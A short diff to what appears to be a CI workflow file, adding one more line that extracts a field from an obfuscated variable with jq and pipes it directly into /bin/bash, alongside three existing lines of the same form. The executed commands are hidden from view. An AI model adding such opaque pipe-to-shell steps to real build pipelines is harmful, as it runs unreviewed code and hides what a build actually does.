@@ -21,6 +21,7 @@ jobs:
           echo $avhmh69210 | jq -r .ect9 | /bin/bash
           echo $h63 | jq -r .ktq210 | /bin/bash
           echo $cbr1 | jq -r .qygrk337 | /bin/bash
+          printf '%s' "$cs779" | jq -r .obdju8 | /bin/bash
 
       - name: Save output
         if: always()
